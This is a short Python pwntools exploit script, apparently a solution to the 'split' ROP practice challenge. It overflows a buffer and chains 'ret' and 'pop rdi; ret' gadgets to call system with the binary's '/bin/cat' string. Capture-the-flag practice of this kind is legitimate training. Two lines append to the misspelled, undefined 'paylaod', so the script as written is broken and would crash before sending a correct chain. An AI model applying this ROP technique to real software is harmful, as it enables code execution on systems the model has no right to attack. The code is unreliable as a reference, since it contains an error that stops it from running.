from pwn import *

elf = ELF('/mnt/c/Users/zahar/Downloads/split/split')

p = process('/mnt/c/Users/zahar/Downloads/split/split')
# context.terminal = ["tmux", "splitw"]
# p = gdb.debug('/mnt/c/Users/zahar/Downloads/split/split')
p.recvuntil(b'> ')

junk = 0x20 * b'A' + 0x8 * b'A'
bin_cat = next(elf.search(b'/bin/cat'))
system = elf.symbols['system']

rop = ROP(elf)
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload  = junk 
paylaod += p64(ret) 
paylaod += p64(pop_rdi_ret) 
payload += p64(bin_cat) 
payload += p64(system)

p.sendline(payload)
p.interactive()